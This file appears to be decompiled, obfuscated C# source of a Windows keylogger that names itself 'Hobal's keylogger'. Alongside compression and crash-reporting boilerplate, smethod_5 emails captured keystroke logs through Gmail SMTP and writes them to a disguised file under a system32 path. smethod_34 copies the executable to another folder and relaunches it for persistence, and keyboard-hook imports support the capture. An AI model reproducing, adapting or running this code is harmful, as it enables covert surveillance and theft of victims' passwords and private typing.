using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Web.Services.Protocols;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using SmartAssembly.SmartExceptionsCore;
using ns0;
using ns1;
using ns2;
using ns3;
using ns4;
using ns7;
using ns8;

namespace ns5;

internal sealed class Class32
{
	unsafe static void smethod_0(int stored, bool storedOffset, byte[] storedLength, Class20.Class27 lastBlock, int int_0)
	{
		void* ptr = stackalloc byte[24];
		short[] short_;
		(short_ = lastBlock.class28_0.short_0)[256] = (short)(short_[256] + 1);
		Class32.smethod_82(lastBlock.class28_0);
		Class32.smethod_82(lastBlock.class28_1);
		Class32.smethod_78(lastBlock.class28_0, lastBlock.class28_2);
		Class32.smethod_78(lastBlock.class28_1, lastBlock.class28_2);
		Class32.smethod_82(lastBlock.class28_2);
		*(int*)ptr = 4;
		*(int*)((byte*)ptr + 4) = 18;
		while (*(int*)((byte*)ptr + 4) > *(int*)ptr)
		{
			if (lastBlock.class28_2.byte_0[Class20.Class27.int_8[*(int*)((byte*)ptr + 4)]] > 0)
			{
				*(int*)ptr = *(int*)((byte*)ptr + 4) + 1;
			}
			(*(int*)((byte*)ptr + 4))--;
		}
		*(int*)((byte*)ptr + 8) = 14 + *(int*)ptr * 3 + Class32.smethod_96(lastBlock.class28_2) + Class32.smethod_96(lastBlock.class28_0) + Class32.smethod_96(lastBlock.class28_1) + lastBlock.int_10;
		*(int*)((byte*)ptr + 12) = lastBlock.int_10;
		*(int*)((byte*)ptr + 16) = 0;
		while (*(int*)((byte*)ptr + 16) < 286)
		{
			*(int*)((byte*)ptr + 12) += lastBlock.class28_0.short_0[*(int*)((byte*)ptr + 16)] * Class20.Class27.byte_2[*(int*)((byte*)ptr + 16)];
			(*(int*)((byte*)ptr + 16))++;
		}
		*(int*)((byte*)ptr + 20) = 0;
		while (*(int*)((byte*)ptr + 20) < 30)
		{
			*(int*)((byte*)ptr + 12) += lastBlock.class28_1.short_0[*(int*)((byte*)ptr + 20)] * Class20.Class27.byte_3[*(int*)((byte*)ptr + 20)];
			(*(int*)((byte*)ptr + 20))++;
		}
		if (*(int*)((byte*)ptr + 8) >= *(int*)((byte*)ptr + 12))
		{
			*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
		}
		if (stored >= 0 && int_0 + 4 < *(int*)((byte*)ptr + 8) >> 3)
		{
			Class32.smethod_33(storedLength, int_0, lastBlock, storedOffset, stored);
		}
		else if (*(int*)((byte*)ptr + 8) == *(int*)((byte*)ptr + 12))
		{
			Class32.smethod_54(lastBlock.class30_0, 2 + (storedOffset ? 1 : 0), 3);
			Class20.Class27.Class28 class28_ = lastBlock.class28_0;
			short[] short_2 = Class20.Class27.short_1;
			byte[] byte_ = Class20.Class27.byte_2;
			Class32.smethod_53(short_2, byte_, class28_);
			class28_ = lastBlock.class28_1;
			short_2 = Class20.Class27.short_2;
			byte_ = Class20.Class27.byte_3;
			Class32.smethod_53(short_2, byte_, class28_);
			Class32.smethod_117(lastBlock);
			Class32.smethod_118(lastBlock);
		}
		else
		{
			Class32.smethod_54(lastBlock.class30_0, 4 + (storedOffset ? 1 : 0), 3);
			Class32.smethod_49(lastBlock, *(int*)ptr);
			Class32.smethod_117(lastBlock);
			Class32.smethod_118(lastBlock);
		}
	}

	unsafe static bool smethod_1(Class20.Class25 input, Class20.Class22 class22_0)
	{
		void* ptr = stackalloc byte[9];
		while (true)
		{
			switch (input.int_8)
			{
			default:
				continue;
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class20.Class25.int_7[input.int_13];
				int num = Class32.smethod_23(class22_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class32.smethod_120(class22_0, *(int*)((byte*)ptr + 4));
					num += Class20.Class25.int_6[input.int_13];
					while (num-- > 0)
					{
						input.byte_1[input.int_14++] = input.byte_2;
					}
					if (input.int_14 == input.int_12)
					{
						((byte*)ptr)[8] = 1;
						break;
					}
					goto IL_00a6;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class32.smethod_76(input.class24_0, class22_0)) & -16) == 0)
				{
					input.byte_1[input.int_14++] = (input.byte_2 = (byte)num2);
					if (input.int_14 != input.int_12)
					{
						continue;
					}
					goto IL_02ab;
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						input.byte_2 = 0;
					}
					input.int_13 = num2 - 16;
					input.int_8 = 5;
					goto case 5;
				}
				((byte*)ptr)[8] = 0;
				break;
			}
			case 3:
				while (input.int_14 < input.int_11)
				{
					*(int*)ptr = Class32.smethod_23(class22_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class32.smethod_120(class22_0, 3);
						input.byte_0[Class20.Class25.int_15[input.int_14]] = (byte)(*(uint*)ptr);
						input.int_14++;
						continue;
					}
					goto IL_029d;
				}
				input.class24_0 = new Class20.Class24(input.byte_0);
				input.byte_0 = null;
				input.int_14 = 0;
				input.int_8 = 4;
				goto case 4;
			case 2:
				input.int_11 = Class32.smethod_23(class22_0, 4);
				if (input.int_11 >= 0)
				{
					input.int_11 += 4;
					Class32.smethod_120(class22_0, 4);
					input.byte_0 = new byte[19];
					input.int_14 = 0;
					input.int_8 = 3;
					goto case 3;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 1:
				input.int_10 = Class32.smethod_23(class22_0, 5);
				if (input.int_10 >= 0)
				{
					input.int_10++;
					Class32.smethod_120(class22_0, 5);
					input.int_12 = input.int_9 + input.int_10;
					input.byte_1 = new byte[input.int_12];
					input.int_8 = 2;
					goto case 2;
				}
				((byte*)ptr)[8] = 0;
				break;
			case 0:
				{
					input.int_9 = Class32.smethod_23(class22_0, 5);
					if (input.int_9 >= 0)
					{
						input.int_9 += 257;
						Class32.smethod_120(class22_0, 5);
						input.int_8 = 1;
						goto case 1;
					}
					((byte*)ptr)[8] = 0;
					break;
				}
				IL_02ab:
				((byte*)ptr)[8] = 1;
				break;
				IL_029d:
				((byte*)ptr)[8] = 0;
				break;
			}
			break;
			IL_00a6:
			input.int_8 = 4;
		}
		return ((byte*)ptr)[8] != 0;
	}

	static void smethod_2(int dict, int offset, Class20.Class23 len, byte[] byte_0)
	{
		if (len.int_3 > 0)
		{
			throw new InvalidOperationException();
		}
		if (dict > 32768)
		{
			offset += dict - 32768;
			dict = 32768;
		}
		Array.Copy(byte_0, offset, len.byte_0, 0, dict);
		len.int_2 = dict & 0x7FFF;
	}

	static byte[] smethod_3(byte[] data, string xmlPublicKey)
	{
		if (xmlPublicKey.StartsWith("{"))
		{
			Class33.string_0 = "ERR 2006: This template was not properly processed by SmartAssembly";
			return null;
		}
		RijndaelManaged rijndaelManaged = null;
		RSACryptoServiceProvider rSACryptoServiceProvider = null;
		MemoryStream memoryStream = null;
		CryptoStream cryptoStream = null;
		try
		{
			rijndaelManaged = new RijndaelManaged();
			rSACryptoServiceProvider = new RSACryptoServiceProvider();
			rSACryptoServiceProvider.FromXmlString(xmlPublicKey);
			rijndaelManaged.GenerateKey();
			rijndaelManaged.GenerateIV();
			byte[] array = new byte[48];
			Buffer.BlockCopy(rijndaelManaged.Key, 0, array, 0, 32);
			Buffer.BlockCopy(rijndaelManaged.IV, 0, array, 32, 16);
			memoryStream = new MemoryStream();
			try
			{
				byte[] array2 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
				memoryStream.WriteByte(1);
				memoryStream.WriteByte(Convert.ToByte(array2.Length / 8));
				memoryStream.Write(array2, 0, array2.Length);
			}
			catch (CryptographicException)
			{
				try
				{
					byte[] array3 = new byte[16];
					byte[] array4 = new byte[16];
					Buffer.BlockCopy(rijndaelManaged.Key, 0, array3, 0, 16);
					Buffer.BlockCopy(rijndaelManaged.Key, 16, array4, 0, 16);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array3, fOAEP: false);
					byte[] array6 = rSACryptoServiceProvider.Encrypt(array4, fOAEP: false);
					byte[] array7 = rSACryptoServiceProvider.Encrypt(rijndaelManaged.IV, fOAEP: false);
					memoryStream.WriteByte(2);
					memoryStream.WriteByte(Convert.ToByte(array5.Length / 8));
					memoryStream.Write(array5, 0, array5.Length);
					memoryStream.Write(array6, 0, array6.Length);
					memoryStream.Write(array7, 0, array7.Length);
				}
				catch (CryptographicException)
				{
					Class33.string_0 = "ERR 2005: The 128-bit encryption is not available on this computer. You need to install the High Encryption Pack in order to use the reporting feature.";
					return null;
				}
			}
			cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(data, 0, data.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch (Exception ex3)
		{
			Class33.string_0 = "ERR 2004: " + ex3.Message;
			return null;
		}
		finally
		{
			rijndaelManaged?.Clear();
			rSACryptoServiceProvider?.Clear();
			memoryStream?.Close();
			cryptoStream?.Close();
		}
	}

	[DllImport("shell32")]
	static extern int ExtractIconEx(string lpszFile, int nIconIndex, ref int phiconLarge, ref int phiconSmall, int nIcons);

	static void smethod_4(Class20.Class23 repStart, int len, int dist, int int_0)
	{
		while (dist-- > 0)
		{
			repStart.byte_0[repStart.int_2++] = repStart.byte_0[len++];
			repStart.int_2 &= 32767;
			len &= 0x7FFF;
		}
	}

	static void smethod_5(Form1 sender, object e, EventArgs eventArgs_0)
	{
		Class32.smethod_122(sender);
		try
		{
			File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\system32\\HAWXGPUTEST.GPU", sender.string_5);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		sender.string_5 = "";
		if (Operators.CompareString(sender.TextBox1.get_Text(), "", false) != 0)
		{
			try
			{
				SmtpClient smtpClient = new SmtpClient();
				MailMessage mailMessage = new MailMessage();
				smtpClient.Credentials = new NetworkCredential(sender.string_0, sender.string_1);
				smtpClient.Port = 587;
				smtpClient.Host = "smtp.gmail.com";
				smtpClient.EnableSsl = true;
				mailMessage = new MailMessage();
				mailMessage.From = new MailAddress(sender.string_0);
				mailMessage.To.Add(sender.string_0);
				mailMessage.Subject = "+-- Hobal's keylogger Server log on " + ((ServerComputer)Class1.Computer).get_Name().ToString() + " At " + Conversions.ToString(((ServerComputer)Class1.Computer).get_Clock().get_LocalTime());
				mailMessage.Body = sender.TextBox1.get_Text();
				smtpClient.Send(mailMessage);
				sender.TextBox1.set_Text("");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
		}
		Class32.smethod_59(sender);
	}

	static void smethod_6(Exception exception, object o1, object o2, object o3, object o4, object o5, object o6, object o7, object o8)
	{
		Class32.smethod_28(exception, new object[8] { o1, o2, o3, o4, o5, o6, o7, o8 });
	}

	static object smethod_7(Class39 class39_0)
	{
		return class39_0.object_0;
	}

	unsafe static int smethod_8(Class20.Class29 class29_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = ((class29_0.int_10 << 5) ^ class29_0.byte_0[class29_0.int_14 + 2]) & 0x7FFF;
		short num = (class29_0.short_1[class29_0.int_14 & 0x7FFF] = class29_0.short_0[*(int*)ptr]);
		class29_0.short_0[*(int*)ptr] = (short)class29_0.int_14;
		class29_0.int_10 = *(int*)ptr;
		*(int*)((byte*)ptr + 4) = num & 0xFFFF;
		return *(int*)((byte*)ptr + 4);
	}

	unsafe static int smethod_9(int output, byte[] offset, int len, Class20.Class23 class23_0)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = class23_0.int_2;
		if (output > class23_0.int_3)
		{
			output = class23_0.int_3;
		}
		else
		{
			*(int*)ptr = (class23_0.int_2 - class23_0.int_3 + output) & 0x7FFF;
		}
		*(int*)((byte*)ptr + 4) = output;
		*(int*)((byte*)ptr + 8) = output - *(int*)ptr;
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Array.Copy(class23_0.byte_0, 32768 - *(int*)((byte*)ptr + 8), offset, len, *(int*)((byte*)ptr + 8));
			len += *(int*)((byte*)ptr + 8);
			output = *(int*)ptr;
		}
		Array.Copy(class23_0.byte_0, *(int*)ptr - output, offset, len, output);
		class23_0.int_3 -= *(int*)((byte*)ptr + 4);
		if (class23_0.int_3 < 0)
		{
			throw new InvalidOperationException();
		}
		*(int*)((byte*)ptr + 12) = *(int*)((byte*)ptr + 4);
		return *(int*)((byte*)ptr + 12);
	}

	static Type smethod_10(Class39 class39_0)
	{
		return class39_0.type_0;
	}

	static string smethod_11()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class16.SubkeyApplication);
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class16.WowSubkeyApplication);
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int UnhookWindowsHookEx(int hHook);

	static Icon smethod_12()
	{
		try
		{
			return Class32.smethod_27();
		}
		catch (Exception)
		{
			return Class32.smethod_124("default");
		}
	}

	unsafe static int smethod_13(Class20.Class22 output, byte[] offset, int length, int int_0)
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		while (output.int_2 > 0 && int_0 > 0)
		{
			offset[length++] = (byte)output.uint_0;
			output.uint_0 >>= 8;
			output.int_2 -= 8;
			int_0--;
			(*(int*)ptr)++;
		}
		if (int_0 == 0)
		{
			*(int*)((byte*)ptr + 8) = *(int*)ptr;
		}
		else
		{
			*(int*)((byte*)ptr + 4) = output.int_1 - output.int_0;
			if (int_0 > *(int*)((byte*)ptr + 4))
			{
				int_0 = *(int*)((byte*)ptr + 4);
			}
			Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
			output.int_0 += int_0;
			if (((uint)(output.int_0 - output.int_1) & (true ? 1u : 0u)) != 0)
			{
				output.uint_0 = output.byte_0[output.int_0++] & 0xFFu;
				output.int_2 = 8;
			}
			*(int*)((byte*)ptr + 8) = *(int*)ptr + int_0;
		}
		return *(int*)((byte*)ptr + 8);
	}

	static void smethod_14(Class20.Class23 len, int dist, int int_0)
	{
		if ((len.int_3 += dist) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (len.int_2 - int_0) & 0x7FFF;
		int num2 = 32768 - dist;
		if (num <= num2 && len.int_2 < num2)
		{
			if (dist <= int_0)
			{
				Array.Copy(len.byte_0, num, len.byte_0, len.int_2, dist);
				len.int_2 += dist;
			}
			else
			{
				while (dist-- > 0)
				{
					len.byte_0[len.int_2++] = len.byte_0[num++];
				}
			}
		}
		else
		{
			Class32.smethod_4(len, num, dist, int_0);
		}
	}

	static void smethod_15(Exception exception, object o1, object o2, object o3, object o4, object o5, object o6, object o7)
	{
		Class32.smethod_28(exception, new object[7] { o1, o2, o3, o4, o5, o6, o7 });
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int CallNextHookEx(int hHook, int nCode, int wParam, Form1.Struct0 lParam);

	static void smethod_16(Class34 step, Enum2 errorMessage, string reportId, string string_0)
	{
		step.delegate3_0?.Invoke(step, new EventArgs3(errorMessage, reportId, string_0));
	}

	static int smethod_17(int graphics, Graphics text, Font font, string width)
	{
		Class47.Struct20 lpRect = new Class47.Struct20(new Rectangle(0, 0, graphics, 10000));
		IntPtr hdc = text.GetHdc();
		IntPtr hGdiObj = font.ToHfont();
		IntPtr hGdiObj2 = Class32.SelectObject(hdc, hGdiObj);
		Class32.DrawText(hdc, width, -1, ref lpRect, 3088);
		Class32.SelectObject(hdc, hGdiObj2);
		text.ReleaseHdc(hdc);
		return lpRect.int_3 - lpRect.int_1;
	}

	static void smethod_18(byte[] block, int offset, Class20.Class30 len, int int_0)
	{
		Array.Copy(block, offset, len.byte_0, len.int_1, int_0);
		len.int_1 += int_0;
	}

	static void smethod_19(Class20.Class22 class22_0)
	{
		int num = 0;
		class22_0.int_2 = 0;
		num = 0;
		class22_0.int_1 = 0;
		num = 0;
		class22_0.int_0 = 0;
		class22_0.uint_0 = 0u;
	}

	static bool smethod_20(Class20.Class27 class27_0)
	{
		return class27_0.int_9 >= 16384;
	}

	unsafe static bool smethod_21(Class20.Class21 class21_0)
	{
		void* ptr = stackalloc byte[13];
		switch (class21_0.int_17)
		{
		case 2:
			if (class21_0.bool_0)
			{
				class21_0.int_17 = 12;
				((byte*)ptr)[12] = 0;
				break;
			}
			*(int*)ptr = Class32.smethod_23(class21_0.class22_0, 3);
			if (*(int*)ptr < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class32.smethod_120(class21_0.class22_0, 3);
			if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
			{
				class21_0.bool_0 = true;
			}
			switch (*(int*)ptr >> 1)
			{
			case 0:
				Class32.smethod_89(class21_0.class22_0);
				class21_0.int_17 = 3;
				break;
			case 1:
				class21_0.class24_0 = Class20.Class24.class24_0;
				class21_0.class24_1 = Class20.Class24.class24_1;
				class21_0.int_17 = 7;
				break;
			case 2:
				class21_0.class25_0 = new Class20.Class25();
				class21_0.int_17 = 6;
				break;
			}
			((byte*)ptr)[12] = 1;
			break;
		case 3:
			if ((class21_0.int_21 = Class32.smethod_23(class21_0.class22_0, 16)) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class32.smethod_120(class21_0.class22_0, 16);
			class21_0.int_17 = 4;
			goto case 4;
		case 4:
			*(int*)((byte*)ptr + 4) = Class32.smethod_23(class21_0.class22_0, 16);
			if (*(int*)((byte*)ptr + 4) < 0)
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			Class32.smethod_120(class21_0.class22_0, 16);
			class21_0.int_17 = 5;
			goto case 5;
		case 5:
			*(int*)((byte*)ptr + 8) = Class32.smethod_152(class21_0.class23_0, class21_0.class22_0, class21_0.int_21);
			class21_0.int_21 -= *(int*)((byte*)ptr + 8);
			if (class21_0.int_21 == 0)
			{
				class21_0.int_17 = 2;
				((byte*)ptr)[12] = 1;
			}
			else
			{
				((byte*)ptr)[12] = ((!class21_0.class22_0.IsNeedingInput) ? ((byte)1) : ((byte)0));
			}
			break;
		case 6:
			if (!Class32.smethod_1(class21_0.class25_0, class21_0.class22_0))
			{
				((byte*)ptr)[12] = 0;
				break;
			}
			class21_0.class24_0 = Class32.smethod_32(class21_0.class25_0);
			class21_0.class24_1 = Class32.smethod_39(class21_0.class25_0);
			class21_0.int_17 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			((byte*)ptr)[12] = (Class32.smethod_56(class21_0) ? ((byte)1) : ((byte)0));
			break;
		default:
			((byte*)ptr)[12] = 0;
			break;
		case 12:
			((byte*)ptr)[12] = 0;
			break;
		}
		return ((byte*)ptr)[12] != 0;
	}

	static void smethod_22(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static int smethod_23(Class20.Class22 n, int int_0)
	{
		if (n.int_2 < int_0)
		{
			if (n.int_0 == n.int_1)
			{
				return -1;
			}
			n.uint_0 |= (uint)(((n.byte_0[n.int_0++] & 0xFF) | ((n.byte_0[n.int_0++] & 0xFF) << 8)) << n.int_2);
			n.int_2 += 16;
		}
		return (int)(n.uint_0 & ((1 << int_0) - 1));
	}

	static Bitmap smethod_24(string key)
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + key + ".png");
			return (manifestResourceStream == null) ? ((Bitmap)null) : new Bitmap(manifestResourceStream);
		}
		catch
		{
			return null;
		}
	}

	static void smethod_25(Class20.Class26 buffer, byte[] byte_0)
	{
		Class32.smethod_29(buffer.class29_0, byte_0);
	}

	unsafe static void smethod_26(Class34.Class36 loginResult, string string_0)
	{
		if (string_0 == "OK")
		{
			Class32.smethod_30(loginResult.class34_0, Enum2.const_2);
			byte[] bytes = Encoding.UTF8.GetBytes("{C61C9459-17A0-4FB9-B2AC-64C5861D882A}");
			byte[] array = new byte[bytes.Length + loginResult.byte_0.Length];
			Array.Copy(bytes, array, bytes.Length);
			Array.Copy(loginResult.byte_0, 0, array, bytes.Length, loginResult.byte_0.Length);
			Class34.Class37 @class = new Class34.Class37(loginResult.class34_0);
			Class46 class46_ = loginResult.class46_0;
			string string_ = loginResult.class38_0.string_0;
			string string_2 = loginResult.class38_0.string_1;
			string string_3 = loginResult.class38_0.string_2;
			Delegate4 appFriendlyName = new Delegate4(@class, (nint)(delegate*<Class34.Class37, string, void>)(&Class32.smethod_31));
			Class32.smethod_130(string_, array, appFriendlyName, class46_, string_3, string_2);
			loginResult.bool_0 = @class.bool_0;
		}
		else
		{
			if (loginResult.class34_0.delegate3_0 != null)
			{
				loginResult.class34_0.delegate3_0(loginResult, new EventArgs3(Enum2.const_1, string_0));
			}
			loginResult.bool_0 = false;
		}
	}

	unsafe static Icon smethod_27()
	{
		void* ptr = stackalloc byte[12];
		*(int*)ptr = 0;
		*(int*)((byte*)ptr + 4) = 0;
		*(int*)((byte*)ptr + 8) = Class32.ExtractIconEx(Application.get_ExecutablePath(), -1, ref *(int*)((byte*)ptr + 4), ref *(int*)((byte*)ptr + 4), 1);
		if (*(int*)((byte*)ptr + 8) > 0)
		{
			Class32.ExtractIconEx(Application.get_ExecutablePath(), 0, ref *(int*)ptr, ref *(int*)((byte*)ptr + 4), 1);
			if (*(int*)ptr != 0)
			{
				return Icon.FromHandle(new IntPtr(*(int*)ptr));
			}
		}
		return null;
	}

	unsafe static void smethod_28(Exception caughtException, object[] objects)
	{
		void* ptr = stackalloc byte[16];
		*(int*)ptr = -1;
		*(int*)((byte*)ptr + 4) = -1;
		*(int*)((byte*)ptr + 8) = 0;
		StackTrace stackTrace = new StackTrace(caughtException);
		try
		{
			if (caughtException.StackTrace != null)
			{
				string[] array = caughtException.StackTrace!.Split('\r', '\n');
				string[] array2 = array;
				*(int*)((byte*)ptr + 12) = 0;
				while (*(int*)((byte*)ptr + 12) < array2.Length)
				{
					string text = array2[*(int*)((byte*)ptr + 12)];
					if (text.Length > 0)
					{
						(*(int*)((byte*)ptr + 8))++;
					}
					(*(int*)((byte*)ptr + 12))++;
				}
			}
		}
		catch
		{
			*(int*)((byte*)ptr + 8) = -1;
		}
		try
		{
			if (stackTrace.FrameCount > 0)
			{
				StackFrame frame = stackTrace.GetFrame(stackTrace.FrameCount - 1);
				*(int*)ptr = (frame.GetMethod()!.MetadataToken & 0xFFFFFF) - 1;
				*(int*)((byte*)ptr + 4) = frame.GetILOffset();
			}
		}
		catch
		{
		}
		try
		{
			SmartStackFrame value = new SmartStackFrame(*(int*)ptr, objects, *(int*)((byte*)ptr + 4), *(int*)((byte*)ptr + 8));
			LinkedList<object> linkedList;
			if (!caughtException.Data.Contains("SmartStackFrames"))
			{
				linkedList = new LinkedList<object>();
				caughtException.Data["SmartStackFrames"] = linkedList;
			}
			else
			{
				linkedList = (LinkedList<object>)caughtException.Data["SmartStackFrames"];
			}
			linkedList.AddLast(value);
		}
		catch
		{
		}
	}

	static void smethod_29(Class20.Class29 buffer, byte[] byte_0)
	{
		buffer.byte_1 = byte_0;
		buffer.int_17 = 0;
		buffer.int_18 = byte_0.Length;
	}

	static void smethod_30(Class34 step, Enum2 enum2_0)
	{
		Class32.smethod_72(step, enum2_0, string.Empty);
	}

	static void smethod_31(Class34.Class37 transferingResult, string string_0)
	{
		if (string_0.StartsWith("ERR"))
		{
			Class32.smethod_72(transferingResult.class34_0, Enum2.const_2, string_0);
			transferingResult.bool_0 = false;
		}
		else
		{
			Class32.smethod_16(transferingResult.class34_0, Enum2.const_3, string.Empty, string_0);
			transferingResult.bool_0 = true;
		}
	}

	static Class20.Class24 smethod_32(Class20.Class25 class25_0)
	{
		byte[] array = new byte[class25_0.int_9];
		Array.Copy(class25_0.byte_1, 0, array, 0, class25_0.int_9);
		return new Class20.Class24(array);
	}

	static void smethod_33(byte[] stored, int storedOffset, Class20.Class27 storedLength, bool lastBlock, int int_0)
	{
		Class32.smethod_54(storedLength.class30_0, lastBlock ? 1 : 0, 3);
		Class32.smethod_144(storedLength.class30_0);
		Class32.smethod_61(storedOffset, storedLength.class30_0);
		Class32.smethod_61(~storedOffset, storedLength.class30_0);
		Class32.smethod_18(stored, int_0, storedLength.class30_0, storedOffset);
		Class32.smethod_118(storedLength);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static unsafe void smethod_34(Form1 path, string string_0)
	{
		void* ptr = stackalloc byte[8];
		try
		{
			if (Application.get_StartupPath().Contains(string_0))
			{
				return;
			}
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\firefox.tmp", Application.get_ExecutablePath());
			while (true)
			{
				string text = Process.GetCurrentProcess().ProcessName + ".exe";
				Process[] processes;
				if (File.Exists(string_0 + "\\" + text))
				{
					processes = Process.GetProcesses();
					*(int*)((byte*)ptr + 4) = processes.Length;
					*(int*)ptr = 0;
					while (*(int*)ptr <= *(int*)((byte*)ptr + 4))
					{
						if (Operators.CompareString(processes[*(int*)ptr].ProcessName, text, false) == 0)
						{
							goto IL_0069;
						}
						checked
						{
							(*unchecked((int*)ptr))++;
						}
					}
					((ServerComputer)Class1.Computer).get_FileSystem().DeleteFile(string_0 + "\\" + text);
				}
				else
				{
					File.Copy(Application.get_ExecutablePath(), string_0 + "\\" + text);
					Process.Start(string_0 + "\\" + text);
				}
				break;
				IL_0069:
				processes[*(int*)ptr].Kill();
			}
			ProjectData.EndApp();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_35(string name, Class35 value, object object_0)
	{
		value.dictionary_0.Add(name, object_0);
	}

	unsafe static bool smethod_36(bool flush, Class20.Class29 finish, bool bool_0)
	{
		void* ptr = stackalloc byte[2];
		do
		{
			Class32.smethod_125(finish);
			bool bool_ = flush && finish.int_17 == finish.int_18;
			*(bool*)ptr = Class32.smethod_105(bool_0, finish, bool_);
		}
		while (finish.class30_0.IsFlushed && *(bool*)ptr);
		((byte*)ptr)[1] = *(byte*)ptr;
		return ((byte*)ptr)[1] != 0;
	}

	unsafe static int smethod_37(Class20.Class27 distance, int int_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		while (int_0 >= 4)
		{
			*(int*)ptr += 2;
			int_0 >>= 1;
		}
		*(int*)((byte*)ptr + 4) = *(int*)ptr + int_0;
		return *(int*)((byte*)ptr + 4);
	}

	static object smethod_38(Form1 form1_0)
	{
		return form1_0.intptr_0 != (IntPtr)0;
	}

	static Class20.Class24 smethod_39(Class20.Class25 class25_0)
	{
		byte[] array = new byte[class25_0.int_10];
		Array.Copy(class25_0.byte_1, class25_0.int_9, array, 0, class25_0.int_10);
		return new Class20.Class24(array);
	}

	static short smethod_40(int toReverse)
	{
		return (short)((Class20.Class27.byte_0[toReverse & 0xF] << 12) | (Class20.Class27.byte_0[(toReverse >> 4) & 0xF] << 8) | (Class20.Class27.byte_0[(toReverse >> 8) & 0xF] << 4) | Class20.Class27.byte_0[toReverse >> 12]);
	}

	static int smethod_41(Class20.Class30 output, byte[] offset, int length, int int_0)
	{
		if (output.int_2 >= 8)
		{
			output.byte_0[output.int_1++] = (byte)output.uint_0;
			output.uint_0 >>= 8;
			output.int_2 -= 8;
		}
		if (int_0 > output.int_1 - output.int_0)
		{
			int_0 = output.int_1 - output.int_0;
			Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
			output.int_0 = 0;
			output.int_1 = 0;
		}
		else
		{
			Array.Copy(output.byte_0, output.int_0, offset, length, int_0);
			output.int_0 += int_0;
		}
		return int_0;
	}

	static Assembly smethod_42()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static void smethod_43(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static byte[] smethod_44(byte[] buffer, byte[] key, byte[] iv)
	{
		return Class32.smethod_134(3, key, buffer, iv);
	}

	static void smethod_45(Exception exception, object o1, object o2)
	{
		Class32.smethod_28(exception, new object[2] { o1, o2 });
	}

	static int smethod_46(string graphics, Font text, Graphics font, int width)
	{
		return Size.Ceiling(font.MeasureString(graphics, text, width)).Height;
	}

	static void smethod_47(object[] exception, Exception objects)
	{
		try
		{
			if ((object)objects.GetType() == typeof(Exception) && objects.Message == "{report}")
			{
				objects = objects.InnerException;
			}
			else
			{
				Class32.smethod_28(objects, exception);
			}
			Class44.Handler.method_1(objects, canContinue: true, manuallyReported: true);
		}
		catch
		{
		}
	}

	[DllImport("user32.dll")]
	static extern int GetSystemMetrics(int smIndex);

	[DllImport("kernel32.dll")]
	static extern void GetSystemInfo(ref Class47.Struct22 lpSystemInfo);

	static object smethod_48(string valueName, object defaultValue)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class16.SubkeyApplication);
		if (registryKey == null)
		{
			return defaultValue;
		}
		return registryKey.GetValue(valueName, defaultValue);
	}

